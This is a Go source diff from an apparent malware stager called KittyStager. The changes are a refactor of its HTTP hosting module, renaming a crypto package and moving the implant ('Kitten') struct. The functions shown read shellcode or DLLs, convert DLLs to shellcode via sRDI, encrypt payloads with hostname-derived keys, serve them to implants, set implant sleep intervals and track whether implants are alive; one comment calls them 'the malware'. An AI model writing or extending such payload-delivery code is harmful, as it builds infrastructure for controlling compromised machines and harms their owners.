@@ -1,7 +1,7 @@
 package httpUtil
 
 import (
-	"KittyStager/cmd/cryptoUtil"
+	"KittyStager/cmd/crypto"
 	"KittyStager/cmd/srdi"
 	"KittyStager/cmd/util"
 	"encoding/json"
@@ -12,23 +12,13 @@ import (
 	"time"
 )
 
-type Kitten struct {
-	Name       string
-	Payload    []byte
-	Sleep      int
-	Id         int
-	LastSeen   time.Time
-	InitChecks util.InitialChecks
-	Alive      bool
-}
-
 var Targets map[string]*Kitten
 
 // HostShellcode Hosts the shellcode
 func HostShellcode(path string, kittenName string) error {
 	var task util.Task
 	var err error
-	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
 	sc, err := ioutil.ReadFile(path)
 	contentType := http.DetectContentType(sc)
 	//checks if the file is a hex file
@@ -37,11 +27,11 @@ func HostShellcode(path string, kittenName string) error {
 		// check if the file is a binary
 	} else if contentType == "application/octet-stream" {
 		hexstring := fmt.Sprintf("%x ", sc)
-		task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}
-
+		task.SetTag("shellcode")
+		task.SetPayload([]byte(hexstring))
 	}
 	payload, err := json.Marshal(task)
-	shellcode, err := cryptoUtil.Encrypt(payload, key)
+	shellcode, err := crypto.Encrypt(payload, key)
 
 	if err != nil {
 		return err
@@ -56,13 +46,14 @@ func HostShellcode(path string, kittenName string) error {
 func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
 	var task util.Task
-	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
-	task = util.Task{Tag: "sleep", Payload: []byte(fmt.Sprintf("%d", t))}
+	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	task.SetTag("sleep")
+	task.SetPayload([]byte(fmt.Sprintf("%d", t)))
 	payload, err := json.Marshal(task)
 	if err != nil {
 		return err
 	}
-	sleep, err := cryptoUtil.Encrypt(payload, key)
+	sleep, err := crypto.Encrypt(payload, key)
 	if err != nil {
 		return err
 	}
@@ -74,16 +65,17 @@ func HostSleep(t int, kittenName string) error {
 func HostDll(path, entry, kittenName string) error {
 	var task util.Task
 	var err error
-	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
 	dll, err := ioutil.ReadFile(path)
 	if err != nil {
 		return err
 	}
 	sc, err := srdi.DllToShellcode(dll, entry)
 	hexstring := fmt.Sprintf("%x ", sc)
-	task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}
+	task.SetTag("shellcode")
+	task.SetPayload([]byte(hexstring))
 	payload, err := json.Marshal(task)
-	shellcode, err := cryptoUtil.Encrypt(payload, key)
+	shellcode, err := crypto.Encrypt(payload, key)
 
 	if err != nil {
 		return err
@@ -94,7 +86,7 @@ func HostDll(path, entry, kittenName string) error {
 	return error(nil)
 }
 
-// CheckAlive checks if the malware is alive. If last seen is longer that the sleep time it will...
+// CheckAlive checks if the malware is alive. If last seen is longer that the sleep time it will mark it
 func CheckAlive() {
 	for {
 		time.Sleep(1 * time.Second)
@@ -109,56 +101,4 @@ func CheckAlive() {
 			}
 		}
 	}
-}
-
-func (K *Kitten) GetTarget() string {
-	return K.Name
-}
-
-func (K *Kitten) GetPayload() []byte {
-	return K.Payload
-}
-
-func (K *Kitten) SetPayload(sc []byte) {
-	K.Payload = sc
-}
-
-func (K *Kitten) GetId() int {
-	return K.Id
-}
-
-func (K *Kitten) SetId(id int) {
-	K.Id = id
-}
-
-func (K *Kitten) GetLastSeen() time.Time {
-	return K.LastSeen
-}
-
-func (K *Kitten) SetLastSeen(t time.Time) {
-	K.LastSeen = t
-}
-
-func (K *Kitten) GetInitChecks() util.InitialChecks {
-	return K.InitChecks
-}
-
-func (K *Kitten) SetInitChecks(c util.InitialChecks) {
-	K.InitChecks = c
-}
-
-func (K *Kitten) GetSleep() int {
-	return K.Sleep
-}
-
-func (K *Kitten) SetSleep(t int) {
-	K.Sleep = t
-}
-
-func (K *Kitten) GetAlive() bool {
-	return K.Alive
-}
-
-func (K *Kitten) SetAlive(b bool) {
-	K.Alive = b
 }
